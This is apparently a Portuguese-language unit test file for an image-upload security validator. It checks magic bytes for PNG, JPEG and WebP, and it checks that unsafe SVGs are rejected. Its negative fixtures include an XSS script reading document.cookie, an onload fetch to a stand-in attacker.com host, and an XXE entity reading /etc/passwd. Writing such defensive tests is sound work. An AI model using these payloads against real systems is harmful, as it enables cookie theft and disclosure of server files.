// backend/tests/unit/infrastructure/services/FileSecurityValidator.spec.ts
import { FileSecurityValidator } from '../../../../src/infrastructure/services/FileSecurityValidator';

describe('FileSecurityValidator (A08: Upload Seguro)', () => {
  it('deve aceitar URLs HTTP e HTTPS válidas', () => {
    const resHttp = FileSecurityValidator.validateImagePayload('http://cdn.celilac.com.br/foto.png');
    const resHttps = FileSecurityValidator.validateImagePayload('https://cdn.celilac.com.br/foto.png');

    expect(resHttp.isSuccess).toBe(true);
    expect(resHttp.getValue().format).toBe('url');
    expect(resHttps.isSuccess).toBe(true);
    expect(resHttps.getValue().format).toBe('url');
  });

  it('deve validar com sucesso um PNG com Magic Bytes corretos', () => {
    // Magic Bytes PNG: 89 50 4E 47 0D 0A 1A 0A
    const validPngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
    const payload = `data:image/png;base64,${validPngBuffer.toString('base64')}`;

    const res = FileSecurityValidator.validateImagePayload(payload);
    expect(res.isSuccess).toBe(true);
    expect(res.getValue().format).toBe('png');
  });

  it('deve rejeitar um falso PNG cujos Magic Bytes são forjados (ex: script em texto)', () => {
    const fakeBuffer = Buffer.from('console.log("malicious payload");');
    const payload = `data:image/png;base64,${fakeBuffer.toString('base64')}`;

    const res = FileSecurityValidator.validateImagePayload(payload);
    expect(res.isFailure).toBe(true);
    expect(res.getError()).toContain('magic bytes');
  });

  it('deve validar com sucesso um JPEG com Magic Bytes corretos', () => {
    // Magic Bytes JPEG: FF D8 FF
    const validJpegBuffer = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
    const payload = `data:image/jpeg;base64,${validJpegBuffer.toString('base64')}`;

    const res = FileSecurityValidator.validateImagePayload(payload);
    expect(res.isSuccess).toBe(true);
    expect(res.getValue().format).toBe('jpeg');
  });

  it('deve validar com sucesso um WebP com Magic Bytes corretos', () => {
    // Magic Bytes WebP: RIFF (bytes 0-3) e WEBP (bytes 8-11)
    const validWebp = Buffer.from('RIFF\x00\x00\x00\x00WEBPVP8L');
    const payload = `data:image/webp;base64,${validWebp.toString('base64')}`;

    const res = FileSecurityValidator.validateImagePayload(payload);
    expect(res.isSuccess).toBe(true);
    expect(res.getValue().format).toBe('webp');
  });

  it('deve aceitar um SVG limpo e bem formado', () => {
    const cleanSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="green"/></svg>';
    const payload = `data:image/svg+xml;base64,${Buffer.from(cleanSvg).toString('base64')}`;

    const res = FileSecurityValidator.validateImagePayload(payload);
    expect(res.isSuccess).toBe(true);
    expect(res.getValue().format).toBe('svg');
  });

  it('deve rejeitar um SVG contendo tag <script> (XSS injection)', () => {
    const xssSvg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>';
    const payload = `data:image/svg+xml;base64,${Buffer.from(xssSvg).toString('base64')}`;

    const res = FileSecurityValidator.validateImagePayload(payload);
    expect(res.isFailure).toBe(true);
    expect(res.getError()).toContain('scripts');
  });

  it('deve rejeitar um SVG contendo manipuladores de eventos (onload/onerror)', () => {
    const eventSvg = '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://attacker.com\')"></svg>';
    const payload = `data:image/svg+xml;base64,${Buffer.from(eventSvg).toString('base64')}`;

    const res = FileSecurityValidator.validateImagePayload(payload);
    expect(res.isFailure).toBe(true);
    expect(res.getError()).toContain('atributos de evento');
  });

  it('deve rejeitar um SVG com tentativa de XXE (<!ENTITY)', () => {
    const xxeSvg = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>';
    const payload = `data:image/svg+xml;base64,${Buffer.from(xxeSvg).toString('base64')}`;

    const res = FileSecurityValidator.validateImagePayload(payload);
    expect(res.isFailure).toBe(true);
    expect(res.getError()).toContain('entidades externas');
  });
});
